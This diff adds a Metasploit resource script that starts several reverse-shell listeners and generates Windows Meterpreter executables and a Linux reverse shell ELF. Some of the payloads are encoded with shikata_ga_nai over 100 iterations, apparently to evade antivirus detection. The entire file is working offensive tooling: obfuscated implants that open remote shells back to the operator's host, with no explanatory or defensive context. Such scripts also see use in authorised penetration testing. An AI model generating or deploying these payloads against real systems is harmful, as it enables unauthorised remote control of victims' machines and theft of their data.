@@ -1,0 +1,40 @@
+mkdir payloads
+
+use exploit/multi/handler
+setg PAYLOAD windows/meterpreter/reverse_https
+setg LPORT 443
+setg LHOST eth0
+set ExitOnSession false
+exploit -j
+use windows/meterpreter/reverse_https
+set ENCODER x86/shikata_ga_nai
+generate -i 100 -f exe -o payloads/met_https.exe
+
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+setg LPORT 7777
+setg LHOST eth0
+setg ExitOnSession false
+exploit -j
+use windows/x64/meterpreter/reverse_tcp
+generate -i 100 -f exe -o payloads/met64.exe
+
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+setg LPORT 8888
+setg LHOST eth0
+setg ExitOnSession false
+exploit -j
+use windows/meterpreter/reverse_tcp
+set ENCODER x86/shikata_ga_nai
+generate -i 100 -f exe -o payloads/met.exe
+
+use exploit/multi/handler
+setg PAYLOAD linux/x86/shell_reverse_tcp
+setg LPORT 9999
+setg LHOST eth0
+set ExitOnSession false
+exploit -j
+use linux/x86/shell_reverse_tcp
+set ENCODER x86/shikata_ga_nai
+generate -i 100 -f elf -o payloads/linux.elf
